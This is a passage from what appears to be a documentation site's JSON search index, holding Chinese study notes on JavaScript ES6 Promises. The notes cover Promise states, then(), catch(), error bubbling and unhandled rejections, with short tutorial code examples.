\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u53ef\u4ee5\u5904\u7406\u5f02\u6b65\u8bf7\u6c42\u4e2d\u7684\u56de\u8c03\u51fd\u6570\u3002\u53ef\u4ee5\u628a\u5f02\u6b65\u8bf7\u6c42\u7684\u4ee3\u7801\u653e\u5728promise\u8fd9\u4e2a\u5bb9\u5668\u4e2d\uff0c\u67d0\u4e2a\u65f6\u95f4\u540e\u4f1a\u89e6\u53d1\u8fd9\u90e8\u5206\u4ee3\u7801\u3002</p> <p>Promise \u5177\u6709\u4e09\u4e2a\u72b6\u6001\uff1apending, fulfilled, rejected\u3002\u7279\u70b9\uff1apromise \u7684\u72b6\u6001\u53ea\u80fd\u4ece pending =&gt; fulfilled or pending =&gt; rejected \u4e24\u79cd\u72b6\u6001\u3002\u72b6\u6001\u4e0d\u53d7\u5916\u754c\u73af\u5883\u7684\u5f71\u54cd\uff08\u53ea\u6709\u5f02\u6b65\u64cd\u4f5c\u7684\u7ed3\u679c\u53ef\u4ee5\u5f71\u54cd\u72b6\u6001\u7684\u53d8\u5316\uff09\uff1b\u72b6\u6001\u5b9e\u73b0\u540e\u5c31\u4f1a\u4e00\u76f4\u4fdd\u6301\uff08\u4e8b\u4ef6\u53d1\u751f\u540e\uff0c\u4e0d\u4f1a\u4e00\u76f4\u4fdd\u6301\uff09</p> <p>\u7f3a\u70b9\uff1a\u8bbe\u7f6e\u7684promise\u4e0d\u80fd\u53d6\u6d88\uff1b\u5982\u679c\u4e0d\u8bbe\u7f6e\u56de\u8c03\u51fd\u6570\uff0c\u90a3\u4e48Promise\u5185\u90e8\u629b\u51fa\u7684\u9519\u8bef\u4e0d\u4f1a\u53cd\u6620\u5230\u5916\u90e8\u3002</p>"},{"location":"ebook-JSES6-RYF/16-Promise/#_2","title":"\u7528\u6cd5","text":"<p>\u4f7f\u7528\u6784\u9020\u51fd\u6570\u521b\u5efapromise\u7684\u5b9e\u4f8b</p> <pre><code>const promise = new Promise(function(resolve, reject) {\n  if (\u5f02\u6b65\u8bf7\u6c42\u6210\u529f) {\n    resolve(result); // \u53ef\u4ee5\u628apromise\u7684\u72b6\u6001\u6539\u53d8 pending =&gt; fulfilled\n  } else {\n    reject(error); // pending =&gt; rejected\n  }\n});\n\npromise.then(function(value) {\n  console.log(value)\n}, function(error) {\n  console.log(eror);\n});\n// then \u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff08\u90fd\u662f\u51fd\u6570\uff09\uff0c\u7b2c\u4e00\u4e2a\u662fpromise\u6210\u529f\u540e\u7684\u56de\u8c03\u51fd\u6570\uff0c\u7b2c\u4e8c\u4e2a\u662f\u53ef\u9009\u7684\u5931\u8d25\u540e\u7684\u56de\u8c03\u51fd\u6570\n</code></pre> <p>\u4f8b\u5b501 setTimeout</p> <pre><code>function timeout(ms) {\n  let promise = new Promise((resolve, reject) =&gt; {\n    // \u53ef\u4ee5\u653e\u4e00\u4e2a\u5f02\u6b65\u8bf7\u6c42\uff0c\u8fd9\u91cc\u4f7f\u7528setTimeout\u6a21\u5f0f\u5f02\u6b65\u8bf7\u6c42\n    // \u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6267\u884c\u7684\u51fd\u6570\uff08\u5c31\u662fresolve\uff0c\u5bf9\u5e94\u4e0b\u9762\u7684\u56de\u8c03\u51fd\u6570\uff09\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u65f6\u95f4\uff0c\u7b2c\u4e09\u4e2a\u548c\u540e\u9762\u7684\u53c2\u6570\u662f\u4f20\u7ed9\u6267\u884c\u51fd\u6570\u7684\u5176\u4ed6\u53c2\u6570\uff1b\n    setTimeout(resolve, ms, 'done');\n  });\n  return promise;\n}\n\ntimeout(500).then((result) =&gt; {\n  console.log(result);\n}, (error) =&gt; {\n  console.log(error);\n});\n</code></pre> <p>\u4f8b\u5b502\uff1a\u5f02\u6b65\u52a0\u8f7d\u56fe\u7247</p> <pre><code>function loadImageAsync(url) {\n  return new Promise(function(resolve, reject) {\n    const image = new Image();\n    image.onload = function() {\n      resolve(image);\n    };\n    image.onerror = function() {\n      reject(new Error('Could not load image at' + url));\n    };\n    image.src = url;\n  })\n}\n</code></pre> <p>\u4f8b\u5b503\uff1aAjax </p> <pre><code>const getJSON = function(url) {\n  const promise = new Promise(function(resolve, reject) {\n    const handler = function() {\n      if (this.readyState !== 4) {\n        return;\n      }\n      if (this.status === 200) {\n        resolve(this.response);\n      } else {\n        reject(new Error(this.statusText));\n      }\n    };\n    const client = new XMLHttpRequest();\n    client.open(\"GET\", url);\n    client.onreadystatechange = handler;\n    client.responseType = \"json\";\n    client.setRequestHeader(\"Accept\", \"application/json\");\n    client.send();\n  });\n  return promise;\n};\n\ngetJSON(\"/posts.json\").then(function(json) {\n  console.log('Contents: ' + json);\n}, function(error) {\n  console.error('\u51fa\u9519\u4e86', error);\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>getJSON</code>\u662f\u5bf9 XMLHttpRequest \u5bf9\u8c61\u7684\u5c01\u88c5\uff0c\u7528\u4e8e\u53d1\u51fa\u4e00\u4e2a\u9488\u5bf9 JSON \u6570\u636e\u7684 HTTP \u8bf7\u6c42\uff0c\u5e76\u4e14\u8fd4\u56de\u4e00\u4e2a<code>Promise</code>\u5bf9\u8c61\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728<code>getJSON</code>\u5185\u90e8\uff0c<code>resolve</code>\u51fd\u6570\u548c<code>reject</code>\u51fd\u6570\u8c03\u7528\u65f6\uff0c\u90fd\u5e26\u6709\u53c2\u6570\u3002</p> <p>\u5982\u679c\u8c03\u7528<code>resolve</code>\u51fd\u6570\u548c<code>reject</code>\u51fd\u6570\u65f6\u5e26\u6709\u53c2\u6570\uff0c\u90a3\u4e48\u5b83\u4eec\u7684\u53c2\u6570\u4f1a\u88ab\u4f20\u9012\u7ed9\u56de\u8c03\u51fd\u6570\u3002<code>reject</code>\u51fd\u6570\u7684\u53c2\u6570\u901a\u5e38\u662f<code>Error</code>\u5bf9\u8c61\u7684\u5b9e\u4f8b\uff0c\u8868\u793a\u629b\u51fa\u7684\u9519\u8bef\uff1b<code>resolve</code>\u51fd\u6570\u7684\u53c2\u6570\u9664\u4e86\u6b63\u5e38\u7684\u503c\u4ee5\u5916\uff0c\u8fd8\u53ef\u80fd\u662f\u53e6\u4e00\u4e2a Promise \u5b9e\u4f8b\uff0c\u6bd4\u5982\u50cf\u4e0b\u9762\u8fd9\u6837\u3002</p> <pre><code>const p1 = new Promise(function (resolve, reject) {\n  // ...\n});\nconst p2 = new Promise(function (resolve, reject) {\n  // ...\n  resolve(p1);\n})\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>p1</code>\u548c<code>p2</code>\u90fd\u662f Promise \u7684\u5b9e\u4f8b\uff0c\u4f46\u662f<code>p2</code>\u7684<code>resolve</code>\u65b9\u6cd5\u5c06<code>p1</code>\u4f5c\u4e3a\u53c2\u6570\uff0c\u5373\u4e00\u4e2a\u5f02\u6b65\u64cd\u4f5c\u7684\u7ed3\u679c\u662f\u8fd4\u56de\u53e6\u4e00\u4e2a\u5f02\u6b65\u64cd\u4f5c\u3002</p> <p>\u6ce8\u610f\uff0c\u8fd9\u65f6<code>p1</code>\u7684\u72b6\u6001\u5c31\u4f1a\u4f20\u9012\u7ed9<code>p2</code>\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c<code>p1</code>\u7684\u72b6\u6001\u51b3\u5b9a\u4e86<code>p2</code>\u7684\u72b6\u6001\u3002\u5982\u679c<code>p1</code>\u7684\u72b6\u6001\u662f<code>pending</code>\uff0c\u90a3\u4e48<code>p2</code>\u7684\u56de\u8c03\u51fd\u6570\u5c31\u4f1a\u7b49\u5f85<code>p1</code>\u7684\u72b6\u6001\u6539\u53d8\uff1b\u5982\u679c<code>p1</code>\u7684\u72b6\u6001\u5df2\u7ecf\u662f<code>resolved</code>\u6216\u8005<code>rejected</code>\uff0c\u90a3\u4e48<code>p2</code>\u7684\u56de\u8c03\u51fd\u6570\u5c06\u4f1a\u7acb\u523b\u6267\u884c\u3002</p> <pre><code>const p1 = new Promise(function (resolve, reject) {\n  setTimeout(() =&gt; reject(new Error('fail')), 3000)\n})\n\nconst p2 = new Promise(function (resolve, reject) {\n  setTimeout(() =&gt; resolve(p1), 1000)\n})\n\np2\n  .then(result =&gt; console.log(result))\n  .catch(error =&gt; console.log(error))\n// Error: fail\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>p1</code>\u662f\u4e00\u4e2a Promise\uff0c3 \u79d2\u4e4b\u540e\u53d8\u4e3a<code>rejected</code>\u3002<code>p2</code>\u7684\u72b6\u6001\u5728 1 \u79d2\u4e4b\u540e\u6539\u53d8\uff0c<code>resolve</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u662f<code>p1</code>\u3002\u7531\u4e8e<code>p2</code>\u8fd4\u56de\u7684\u662f\u53e6\u4e00\u4e2a Promise\uff0c\u5bfc\u81f4<code>p2</code>\u81ea\u5df1\u7684\u72b6\u6001\u65e0\u6548\u4e86\uff0c\u7531<code>p1</code>\u7684\u72b6\u6001\u51b3\u5b9a<code>p2</code>\u7684\u72b6\u6001\u3002\u6240\u4ee5\uff0c\u540e\u9762\u7684<code>then</code>\u8bed\u53e5\u90fd\u53d8\u6210\u9488\u5bf9\u540e\u8005\uff08<code>p1</code>\uff09\u3002\u53c8\u8fc7\u4e86 2 \u79d2\uff0c<code>p1</code>\u53d8\u4e3a<code>rejected</code>\uff0c\u5bfc\u81f4\u89e6\u53d1<code>catch</code>\u65b9\u6cd5\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\u3002</p> <p>\u6ce8\u610f\uff0c\u8c03\u7528<code>resolve</code>\u6216<code>reject</code>\u5e76\u4e0d\u4f1a\u7ec8\u7ed3 Promise \u7684\u53c2\u6570\u51fd\u6570\u7684\u6267\u884c\u3002</p> <pre><code>new Promise((resolve, reject) =&gt; {\n  resolve(1);\n  console.log(2);\n}).then(r =&gt; {\n  console.log(r);\n});\n// 2\n// 1\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8c03\u7528<code>resolve(1)</code>\u4ee5\u540e\uff0c\u540e\u9762\u7684<code>console.log(2)</code>\u8fd8\u662f\u4f1a\u6267\u884c\uff0c\u5e76\u4e14\u4f1a\u9996\u5148\u6253\u5370\u51fa\u6765\u3002\u8fd9\u662f\u56e0\u4e3a\u7acb\u5373 resolved \u7684 Promise \u662f\u5728\u672c\u8f6e\u4e8b\u4ef6\u5faa\u73af\u7684\u672b\u5c3e\u6267\u884c\uff0c\u603b\u662f\u665a\u4e8e\u672c\u8f6e\u5faa\u73af\u7684\u540c\u6b65\u4efb\u52a1\u3002</p> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u8c03\u7528<code>resolve</code>\u6216<code>reject</code>\u4ee5\u540e\uff0cPromise \u7684\u4f7f\u547d\u5c31\u5b8c\u6210\u4e86\uff0c\u540e\u7ee7\u64cd\u4f5c\u5e94\u8be5\u653e\u5230<code>then</code>\u65b9\u6cd5\u91cc\u9762\uff0c\u800c\u4e0d\u5e94\u8be5\u76f4\u63a5\u5199\u5728<code>resolve</code>\u6216<code>reject</code>\u7684\u540e\u9762\u3002\u6240\u4ee5\uff0c\u6700\u597d\u5728\u5b83\u4eec\u524d\u9762\u52a0\u4e0a<code>return</code>\u8bed\u53e5\uff0c\u8fd9\u6837\u5c31\u4e0d\u4f1a\u6709\u610f\u5916\u3002</p> <pre><code>new Promise((resolve, reject) =&gt; {\n  return resolve(1);\n  // \u540e\u9762\u7684\u8bed\u53e5\u4e0d\u4f1a\u6267\u884c\n  console.log(2);\n})\n</code></pre>"},{"location":"ebook-JSES6-RYF/16-Promise/#promiseprototypethen","title":"Promise.prototype.then()","text":"<p>Promise \u5b9e\u4f8b\u5177\u6709<code>then</code>\u65b9\u6cd5\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c<code>then</code>\u65b9\u6cd5\u662f\u5b9a\u4e49\u5728\u539f\u578b\u5bf9\u8c61<code>Promise.prototype</code>\u4e0a\u7684\u3002\u5b83\u7684\u4f5c\u7528\u662f\u4e3a Promise \u5b9e\u4f8b\u6dfb\u52a0\u72b6\u6001\u6539\u53d8\u65f6\u7684\u56de\u8c03\u51fd\u6570\u3002\u524d\u9762\u8bf4\u8fc7==\uff0c<code>then</code>\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f<code>resolved</code>\u72b6\u6001\u7684\u56de\u8c03\u51fd\u6570\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff08\u53ef\u9009\uff09\u662f<code>rejected</code>\u72b6\u6001\u7684\u56de\u8c03\u51fd\u6570\u3002==</p> <p><code>then</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u65b0\u7684<code>Promise</code>\u5b9e\u4f8b\uff08\u6ce8\u610f\uff0c\u4e0d\u662f\u539f\u6765\u90a3\u4e2a<code>Promise</code>\u5b9e\u4f8b\uff09\u3002\u56e0\u6b64\u53ef\u4ee5\u91c7\u7528\u94fe\u5f0f\u5199\u6cd5\uff0c\u5373<code>then</code>\u65b9\u6cd5\u540e\u9762\u518d\u8c03\u7528\u53e6\u4e00\u4e2a<code>then</code>\u65b9\u6cd5\u3002</p> <pre><code>getJSON(\"/posts.json\").then(function(json) {\n  return json.post;\n}).then(function(post) {\n  // ...\n});\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u4f7f\u7528<code>then</code>\u65b9\u6cd5\uff0c\u4f9d\u6b21\u6307\u5b9a\u4e86\u4e24\u4e2a\u56de\u8c03\u51fd\u6570\u3002\u7b2c\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u5b8c\u6210\u4ee5\u540e\uff0c\u4f1a\u5c06\u8fd4\u56de\u7ed3\u679c\u4f5c\u4e3a\u53c2\u6570\uff0c\u4f20\u5165\u7b2c\u4e8c\u4e2a\u56de\u8c03\u51fd\u6570\u3002</p> <p>\u91c7\u7528\u94fe\u5f0f\u7684<code>then</code>\uff0c\u53ef\u4ee5\u6307\u5b9a\u4e00\u7ec4\u6309\u7167\u6b21\u5e8f\u8c03\u7528\u7684\u56de\u8c03\u51fd\u6570\u3002\u8fd9\u65f6\uff0c\u524d\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u6709\u53ef\u80fd\u8fd4\u56de\u7684\u8fd8\u662f\u4e00\u4e2a<code>Promise</code>\u5bf9\u8c61\uff08\u5373\u6709\u5f02\u6b65\u64cd\u4f5c\uff09\uff0c\u8fd9\u65f6\u540e\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u5c31\u4f1a\u7b49\u5f85\u8be5<code>Promise</code>\u5bf9\u8c61\u7684\u72b6\u6001\u53d1\u751f\u53d8\u5316\uff0c\u624d\u4f1a\u88ab\u8c03\u7528\u3002</p> <pre><code>getJSON(\"/post/1.json\").then(function(post) {\n  return getJSON(post.commentURL);\n}).then(function (comments) {\n  console.log(\"resolved: \", comments);\n}, function (err){\n  console.log(\"rejected: \", err);\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u4e2a<code>then</code>\u65b9\u6cd5\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\uff0c\u8fd4\u56de\u7684\u662f\u53e6\u4e00\u4e2a<code>Promise</code>\u5bf9\u8c61\u3002\u8fd9\u65f6\uff0c\u7b2c\u4e8c\u4e2a<code>then</code>\u65b9\u6cd5\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\uff0c\u5c31\u4f1a\u7b49\u5f85\u8fd9\u4e2a\u65b0\u7684<code>Promise</code>\u5bf9\u8c61\u72b6\u6001\u53d1\u751f\u53d8\u5316\u3002\u5982\u679c\u53d8\u4e3a<code>resolved</code>\uff0c\u5c31\u8c03\u7528\u7b2c\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u5982\u679c\u72b6\u6001\u53d8\u4e3a<code>rejected</code>\uff0c\u5c31\u8c03\u7528\u7b2c\u4e8c\u4e2a\u56de\u8c03\u51fd\u6570\u3002</p> <p>\u5982\u679c\u91c7\u7528\u7bad\u5934\u51fd\u6570\uff0c\u4e0a\u9762\u7684\u4ee3\u7801\u53ef\u4ee5\u5199\u5f97\u66f4\u7b80\u6d01\u3002</p> <pre><code>getJSON(\"/post/1.json\").then(post =&gt; {\n  getJSON(post.commentURL);\n}).then(\n  comments =&gt; console.log(\"resolved: \", comments),\n  err =&gt; console.log(\"rejected: \", err)\n);\n</code></pre>"},{"location":"ebook-JSES6-RYF/16-Promise/#promiseprototypecatch","title":"Promise.prototype.catch()","text":"<p><code>Promise.prototype.catch</code>\u65b9\u6cd5\u662f<code>.then(null, rejection)</code>\u6216<code>.then(undefined, rejection)</code>\u7684\u522b\u540d\uff0c\u7528\u4e8e\u6307\u5b9a\u53d1\u751f\u9519\u8bef\u65f6\u7684\u56de\u8c03\u51fd\u6570\u3002</p> <pre><code>getJSON('/posts.json').then(function(posts) {\n  // ...\n}).catch(function(error) {\n  // \u5904\u7406 getJSON \u548c \u524d\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u8fd0\u884c\u65f6\u53d1\u751f\u7684\u9519\u8bef\n  console.log('\u53d1\u751f\u9519\u8bef\uff01', error);\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>getJSON</code>\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a Promise \u5bf9\u8c61\uff0c\u5982\u679c\u8be5\u5bf9\u8c61\u72b6\u6001\u53d8\u4e3a<code>resolved</code>\uff0c\u5219\u4f1a\u8c03\u7528<code>then</code>\u65b9\u6cd5\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\uff1b\u5982\u679c\u5f02\u6b65\u64cd\u4f5c\u629b\u51fa\u9519\u8bef\uff0c\u72b6\u6001\u5c31\u4f1a\u53d8\u4e3a<code>rejected</code>\uff0c\u5c31\u4f1a\u8c03\u7528<code>catch</code>\u65b9\u6cd5\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\uff0c\u5904\u7406\u8fd9\u4e2a\u9519\u8bef\u3002\u53e6\u5916\uff0c<code>then</code>\u65b9\u6cd5\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\uff0c\u5982\u679c\u8fd0\u884c\u4e2d\u629b\u51fa\u9519\u8bef\uff0c\u4e5f\u4f1a\u88ab<code>catch</code>\u65b9\u6cd5\u6355\u83b7\u3002</p> <pre><code>p.then((val) =&gt; console.log('fulfilled:', val))\n  .catch((err) =&gt; console.log('rejected', err));\n\n// \u7b49\u540c\u4e8e\np.then((val) =&gt; console.log('fulfilled:', val))\n  .then(null, (err) =&gt; console.log(\"rejected:\", err));\n</code></pre> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>const promise = new Promise(function(resolve, reject) {\n  throw new Error('test');\n});\npromise.catch(function(error) {\n  console.log(error);\n});\n// Error: test\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>promise</code>\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\uff0c\u5c31\u88ab<code>catch</code>\u65b9\u6cd5\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\u6355\u83b7\u3002\u6ce8\u610f\uff0c\u4e0a\u9762\u7684\u5199\u6cd5\u4e0e\u4e0b\u9762\u4e24\u79cd\u5199\u6cd5\u662f\u7b49\u4ef7\u7684\u3002</p> <pre><code>// \u5199\u6cd5\u4e00\nconst promise = new Promise(function(resolve, reject) {\n  try {\n    throw new Error('test');\n  } catch(e) {\n    reject(e);\n  }\n});\npromise.catch(function(error) {\n  console.log(error);\n});\n\n// \u5199\u6cd5\u4e8c\nconst promise = new Promise(function(resolve, reject) {\n  reject(new Error('test'));\n});\npromise.catch(function(error) {\n  console.log(error);\n});\n</code></pre> <p>\u6bd4\u8f83\u4e0a\u9762\u4e24\u79cd\u5199\u6cd5\uff0c\u53ef\u4ee5\u53d1\u73b0<code>reject</code>\u65b9\u6cd5\u7684\u4f5c\u7528\uff0c\u7b49\u540c\u4e8e\u629b\u51fa\u9519\u8bef\u3002</p> <p>\u5982\u679c Promise \u72b6\u6001\u5df2\u7ecf\u53d8\u6210<code>resolved</code>\uff0c\u518d\u629b\u51fa\u9519\u8bef\u662f\u65e0\u6548\u7684\u3002</p> <pre><code>const promise = new Promise(function(resolve, reject) {\n  resolve('ok');\n  throw new Error('test');\n});\npromise\n  .then(function(value) { console.log(value) })\n  .catch(function(error) { console.log(error) });\n// ok\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cPromise \u5728<code>resolve</code>\u8bed\u53e5\u540e\u9762\uff0c\u518d\u629b\u51fa\u9519\u8bef\uff0c\u4e0d\u4f1a\u88ab\u6355\u83b7\uff0c\u7b49\u4e8e\u6ca1\u6709\u629b\u51fa\u3002\u56e0\u4e3a Promise \u7684\u72b6\u6001\u4e00\u65e6\u6539\u53d8\uff0c\u5c31\u6c38\u4e45\u4fdd\u6301\u8be5\u72b6\u6001\uff0c\u4e0d\u4f1a\u518d\u53d8\u4e86\u3002</p> <p>Promise \u5bf9\u8c61\u7684\u9519\u8bef\u5177\u6709\u201c\u5192\u6ce1\u201d\u6027\u8d28\uff0c\u4f1a\u4e00\u76f4\u5411\u540e\u4f20\u9012\uff0c\u76f4\u5230\u88ab\u6355\u83b7\u4e3a\u6b62\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u9519\u8bef\u603b\u662f\u4f1a\u88ab\u4e0b\u4e00\u4e2a<code>catch</code>\u8bed\u53e5\u6355\u83b7\u3002</p> <pre><code>getJSON('/post/1.json').then(function(post) {\n  return getJSON(post.commentURL);\n}).then(function(comments) {\n  // some code\n}).catch(function(error) {\n  // \u5904\u7406\u524d\u9762\u4e09\u4e2aPromise\u4ea7\u751f\u7684\u9519\u8bef\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e00\u5171\u6709\u4e09\u4e2a Promise \u5bf9\u8c61\uff1a\u4e00\u4e2a\u7531<code>getJSON</code>\u4ea7\u751f\uff0c\u4e24\u4e2a\u7531<code>then</code>\u4ea7\u751f\u3002\u5b83\u4eec\u4e4b\u4e2d\u4efb\u4f55\u4e00\u4e2a\u629b\u51fa\u7684\u9519\u8bef\uff0c\u90fd\u4f1a\u88ab\u6700\u540e\u4e00\u4e2a<code>catch</code>\u6355\u83b7\u3002</p> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u4e0d\u8981\u5728<code>then</code>\u65b9\u6cd5\u91cc\u9762\u5b9a\u4e49 Reject \u72b6\u6001\u7684\u56de\u8c03\u51fd\u6570\uff08\u5373<code>then</code>\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff09\uff0c\u603b\u662f\u4f7f\u7528<code>catch</code>\u65b9\u6cd5\u3002</p> <pre><code>// bad\npromise.then(function(data) {\n  // success\n}, function(err) {\n  // error\n});\n\n// good\npromise.then(function(data) { //cb\n  // success\n}).catch(function(err) {\n  // error\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e8c\u79cd\u5199\u6cd5\u8981\u597d\u4e8e\u7b2c\u4e00\u79cd\u5199\u6cd5\uff0c\u7406\u7531\u662f\u7b2c\u4e8c\u79cd\u5199\u6cd5\u53ef\u4ee5\u6355\u83b7\u524d\u9762<code>then</code>\u65b9\u6cd5\u6267\u884c\u4e2d\u7684\u9519\u8bef\uff0c\u4e5f\u66f4\u63a5\u8fd1\u540c\u6b65\u7684\u5199\u6cd5\uff08<code>try/catch</code>\uff09\u3002\u56e0\u6b64\uff0c\u5efa\u8bae\u603b\u662f\u4f7f\u7528<code>catch</code>\u65b9\u6cd5\uff0c\u800c\u4e0d\u4f7f\u7528<code>then</code>\u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u3002</p> <p>\u8ddf\u4f20\u7edf\u7684<code>try/catch</code>\u4ee3\u7801\u5757\u4e0d\u540c\u7684\u662f\uff0c\u5982\u679c\u6ca1\u6709\u4f7f\u7528<code>catch</code>\u65b9\u6cd5\u6307\u5b9a\u9519\u8bef\u5904\u7406\u7684\u56de\u8c03\u51fd\u6570\uff0cPromise \u5bf9\u8c61\u629b\u51fa\u7684\u9519\u8bef\u4e0d\u4f1a\u4f20\u9012\u5230\u5916\u5c42\u4ee3\u7801\uff0c\u5373\u4e0d\u4f1a\u6709\u4efb\u4f55\u53cd\u5e94\u3002</p> <pre><code>const someAsyncThing = function() {\n  return new Promise(function(resolve, reject) {\n    // \u4e0b\u9762\u4e00\u884c\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3ax\u6ca1\u6709\u58f0\u660e\n    resolve(x + 2);\n  });\n};\n\nsomeAsyncThing().then(function() {\n  console.log('everything is great');\n});\n\nsetTimeout(() =&gt; { console.log(123) }, 2000);\n// Uncaught (in promise) ReferenceError: x is not defined\n// 123\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>someAsyncThing</code>\u51fd\u6570\u4ea7\u751f\u7684 Promise \u5bf9\u8c61\uff0c\u5185\u90e8\u6709\u8bed\u6cd5\u9519\u8bef\u3002\u6d4f\u89c8\u5668\u8fd0\u884c\u5230\u8fd9\u4e00\u884c\uff0c\u4f1a\u6253\u5370\u51fa\u9519\u8bef\u63d0\u793a<code>ReferenceError: x is not defined</code>\uff0c\u4f46\u662f\u4e0d\u4f1a\u9000\u51fa\u8fdb\u7a0b\u3001\u7ec8\u6b62\u811a\u672c\u6267\u884c\uff0c2 \u79d2\u4e4b\u540e\u8fd8\u662f\u4f1a\u8f93\u51fa<code>123</code>\u3002\u8fd9\u5c31\u662f\u8bf4\uff0cPromise \u5185\u90e8\u7684\u9519\u8bef\u4e0d\u4f1a\u5f71\u54cd\u5230 Promise \u5916\u90e8\u7684\u4ee3\u7801\uff0c\u901a\u4fd7\u7684\u8bf4\u6cd5\u5c31\u662f\u201cPromise \u4f1a\u5403\u6389\u9519\u8bef\u201d\u3002</p> <p>\u8fd9\u4e2a\u811a\u672c\u653e\u5728\u670d\u52a1\u5668\u6267\u884c\uff0c\u9000\u51fa\u7801\u5c31\u662f<code>0</code>\uff08\u5373\u8868\u793a\u6267\u884c\u6210\u529f\uff09\u3002\u4e0d\u8fc7\uff0cNode \u6709\u4e00\u4e2a<code>unhandledRejection</code>\u4e8b\u4ef6\uff0c\u4e13\u95e8\u76d1\u542c\u672a\u6355\u83b7\u7684<code>reject</code>\u9519\u8bef\uff0c\u4e0a\u9762\u7684\u811a\u672c\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\uff0c\u53ef\u4ee5\u5728\u76d1\u542c\u51fd\u6570\u91cc\u9762\u629b\u51fa\u9519\u8bef\u3002</p> <pre><code>process.on('unhandledRejection', function (err, p) {\n  throw err;\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>unhandledRejection</code>\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u6709\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u9519\u8bef\u5bf9\u8c61\uff0c\u7b2c\u4e8c\u4e2a\u662f\u62a5\u9519\u7684 Promise \u5b9e\u4f8b\uff0c\u5b83\u53ef\u4ee5\u7528\u6765\u4e86\u89e3\u53d1\u751f\u9519\u8bef\u7684\u73af\u5883\u4fe1\u606f\u3002</p> <p>\u6ce8\u610f\uff0cNode \u6709\u8ba1\u5212\u5728\u672a\u6765\u5e9f\u9664<code>unhandledRejection</code>\u4e8b\u4ef6\u3002\u5982\u679c Promise \u5185\u90e8\u6709\u672a\u6355\u83b7\u7684\u9519\u8bef\uff0c\u4f1a\u76f4\u63a5\u7ec8\u6b62\u8fdb\u7a0b\uff0c\u5e76\u4e14\u8fdb\u7a0b\u7684\u9000\u51fa\u7801\u4e0d\u4e3a 0\u3002</p> <p>\u518d\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\u3002</p> <pre><code>const promise = new Promise(function (resolve, reject) {\n  resolve('ok');\n  setTimeout(function () { throw new Error('test') }, 0)\n});\npromise.then(function (value) { console.log(value) });\n// ok\n// Uncaught Error: test\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cPromise \u6307\u5b9a\u5728\u4e0b\u4e00\u8f6e\u201c\u4e8b\u4ef6\u5faa\u73af\u201d\u518d\u629b\u51fa\u9519\u8bef\u3002\u5230\u4e86\u90a3\u4e2a\u65f6\u5019\uff0cPromise \u7684\u8fd0\u884c\u5df2\u7ecf\u7ed3\u675f\u4e86\uff0c\u6240\u4ee5\u8fd9\u4e2a\u9519\u8bef\u662f\u5728 Promise \u51fd\u6570\u4f53\u5916\u629b\u51fa\u7684\uff0c\u4f1a\u5192\u6ce1\u5230\u6700\u5916\u5c42\uff0c\u6210\u4e86\u672a\u6355\u83b7\u7684\u9519\u8bef\u3002</p> <p>\u4e00\u822c\u603b\u662f\u5efa\u8bae\uff0cPromise \u5bf9\u8c61\u540e\u9762\u8981\u8ddf<code>catch</code>\u65b9\u6cd5\uff0c\u8fd9\u6837\u53ef\u4ee5\u5904\u7406 Promise 